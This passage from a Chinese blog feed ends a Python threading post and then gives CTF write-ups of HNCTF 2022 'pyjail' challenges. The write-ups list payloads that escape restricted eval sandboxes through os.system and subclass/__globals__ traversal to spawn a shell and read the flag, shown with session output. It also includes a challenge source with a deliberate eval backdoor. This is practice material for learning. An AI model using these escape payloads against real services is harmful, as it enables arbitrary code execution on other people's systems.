punctuation">)</span>             <span class="token comment">#解锁</span>x <span class="token operator">=</span> <span class="token number">0</span>                        <span class="token comment">#设置全局变量初始值</span>lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>RLock<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">#创建可重入锁</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                   <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mythread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#创建五个线程，放到同一列表中</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list1<span class="token punctuation">:</span> i<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>                   <span class="token comment">#开启列表线程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="python中的条件锁"><a class="markdownIt-Anchor" href="#python中的条件锁"></a> python中的条件锁</h5><h6 id="threadingconditionlocknone"><a class="markdownIt-Anchor" href="#threadingconditionlocknone"></a> threading.Condition(lock=None)</h6><p>实现条件对象的类。它具有如下方法：</p><ul><li>acquire(*args)：请求底层锁。</li><li>release()：释放底层锁。</li><li>wait(timeout=None)：等待直到被通知或发生超时。</li><li>wait_for(predicate, timeout=None)：等待直到条件计算为 True，predicate 是一个可调用对象且它的返回值可被解释为一个布尔值。</li><li>notify(n=1)：默认唤醒一个等待该条件的线程。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python沙箱逃逸</title>
      <link href="/2024/03/12/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/12/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="cbb34177096fc947e382672683a3ee4f09837620e95ed6e48053d8d9b556c713"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail下</title>
      <link href="/2024/03/04/Pyjail%E4%B8%8B/"/>
      <url>/2024/03/04/Pyjail%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="hnctf-2022-week2calc_jail_beginner_level5jail"><a class="markdownIt-Anchor" href="#hnctf-2022-week2calc_jail_beginner_level5jail"></a> [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28780</span>  _                _                           _       _ _ _                _ _____ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> ____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token operator">/</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>                                       It's so easy challenge!Seems flag into the <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ ls__pycache__  flag  load_flag<span class="token punctuation">.</span>py  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>9f2a7297<span class="token operator">-</span>f41f<span class="token operator">-</span>4c04<span class="token operator">-</span>896d<span class="token operator">-</span>9384cc5e1b49<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hnctf-2022-week2calc_jail_beginner_level51jail"><a class="markdownIt-Anchor" href="#hnctf-2022-week2calc_jail_beginner_level51jail"></a> [HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</h3><p>先试一下 上一个的payload，发现import未被定义。</p><p>而dir()发现[‘<strong>builtins</strong>’, ‘my_flag’]，则builtins还在</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28475</span>  _                _                           _       _ _ _                _ _____ __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> ____<span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>It's so easy challenge!Seems flag into the <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> __builtins__Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/home/ctf/./server.py"</span><span class="token punctuation">,</span> line <span class="token number">42</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>  File <span class="token string">"/home/ctf/./server.py"</span><span class="token punctuation">,</span> line <span class="token number">31</span><span class="token punctuation">,</span> <span class="token keyword">in</span> main  File <span class="token string">"/home/ctf/./server.py"</span><span class="token punctuation">,</span> line <span class="token number">39</span><span class="token punctuation">,</span> <span class="token keyword">in</span> repl  File <span class="token string">"&lt;string>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>  File <span class="token string">"/usr/lib/python3.10/_sitebuiltins.py"</span><span class="token punctuation">,</span> line <span class="token number">61</span><span class="token punctuation">,</span> <span class="token keyword">in</span> __repr__  File <span class="token string">"/usr/lib/python3.10/_sitebuiltins.py"</span><span class="token punctuation">,</span> line <span class="token number">50</span><span class="token punctuation">,</span> <span class="token keyword">in</span> __setupNameError<span class="token punctuation">:</span> name <span class="token string">'open'</span> <span class="token keyword">is</span> <span class="token keyword">not</span> defined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现open被删了</p><p>那就Show subclasses with tuple</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28475</span>  _                _                           _       _ _ _                _ _____ __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> ____<span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>It's so easy challenge!Seems flag into the <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在倒数第六个发现 &lt;class ‘os._wrap_close’&gt;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28475</span>  _                _                           _       _ _ _                _ _____ __ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span> ____<span class="token operator">/</span>_ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>It's so easy challenge!Seems flag into the <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ ls__pycache__  flag  load_flag<span class="token punctuation">.</span>py  server<span class="token punctuation">.</span>py$ cat  flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>18906d38<span class="token operator">-</span>0c29<span class="token operator">-</span>415c<span class="token operator">-</span>bfd6<span class="token operator">-</span>3c1dcd9bb031<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hnctf-2022-week1lake-lake-lakejail"><a class="markdownIt-Anchor" href="#hnctf-2022-week1lake-lake-lakejail"></a> [HNCTF 2022 Week1]lake lake lake(JAIL)</h3><p>得到附件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#it seems have a backdoor</span><span class="token comment">#can u find the key of it and use the backdoor</span>fake_key_var_in_the_local_but_real_in_the_remote <span class="token operator">=</span> <span class="token string">"[DELETED]"</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_var_in_the_local_but_real_in_the_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nooo!!!!"</span><span class="token punctuation">)</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _       _          _       _          _       _         | |     | |        | |     | |        | |     | |        | | __ _| | _____  | | __ _| | _____  | | __ _| | _____  | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Now the program has two functions"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"can you use dockerdoor"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.func"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.backdoor"</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    func<span class="token punctuation">(</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">elif</span><span class="token punctuation">(</span>input_data <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not found the choice"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题的逻辑是输入1和2分别执行func函数和backdoor函数</p><p>func函数有长度限制，backdoor函数没有但是得得到key的值，key显然是一个全局变量，你在func函数输入globals</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28632</span>  _       _          _       _          _       _ <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____  <span class="token operator">|</span> <span class="token operator">|</span> __ _<span class="token operator">|</span> <span class="token operator">|</span> _____ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span> _  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">&lt;</span>  __<span class="token operator">/</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\_\___<span class="token operator">|</span>Now the program has two functionscan you use dockerdoor<span class="token number">1</span><span class="token punctuation">.</span>func<span class="token number">2</span><span class="token punctuation">.</span>backdoor<span class="token operator">></span> <span class="token number">1</span><span class="token operator">></span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_frozen_importlib_external<span class="token punctuation">.</span>SourceFileLoader <span class="token builtin">object</span> at <span class="token 